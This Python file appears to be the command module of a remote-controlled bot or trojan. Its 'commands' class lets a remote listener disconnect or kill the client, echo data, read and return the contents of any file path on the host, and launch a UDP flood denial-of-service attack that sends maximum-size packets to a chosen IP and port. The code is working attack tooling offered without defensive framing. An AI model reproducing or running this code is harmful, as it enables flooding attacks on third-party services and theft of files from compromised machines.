#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
  Pawel Wylecial
  h0wl@cc-team.org

  Matt Harasymczuk
  matt@harasymczuk.pl
  www.matt.harasymczuk.pl
"""

import sys
import socket
import logging
import time

from __init__ import *


class commands:
    """returns message to sent to remote host"""

    def __init__(self, socket):
        self.socket = socket

    def disconnect(self):
        """disconnects from listener"""
        self.socket = None
        return logging.info("200 [OK] Client disconnected.")

    def exit(self):
        """disconnects from listener, alias for disconnect"""
        return self.disconnect()

    def quit(self):
        """disconnects from listener, alias for disconnect"""
        return self.disconnect()

    def kill(self):
        """kill listener"""
        self.disconnect()
        return logging.warning("200 [OK] Closing listener...")

    def echo(self, data):
        """Echo function"""
        msg = '200 [OK] Echo: "%s"' % data
        logging.info(msg)
        return data

    def get(self, path):
        """print remote file"""
        try:
            file = open(path, 'r')
            logging.info('200 [OK] Sending File Contents: "%s"' % path)
            return file.read()

        except IOError:
            msg = '404 [Error] File Not Found: %s' % path
            logging.error(msg)
            return msg

    def file(self, path):
        """print remote file, alias for get"""
        return self.get(path)

    def dos(self, args='127.0.0.1 53 0 '):
        """performs DoS attack on target"""
        floodMsg = "X" * 65507
        ip, port, count = args.split(' ')
        logging.info('DoS attack on %s:%s' % (ip, port))
        UDPSock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        x = 0
        count = int(count)
        try:
            while (x < count):
                UDPSock.sendto(floodMsg, (ip, int(port)))
                x = x + 1
        except:
            logging.error('UDP sock failed')
        logging.info('Attack finished')
        UDPSock.close()
        return 'ok'
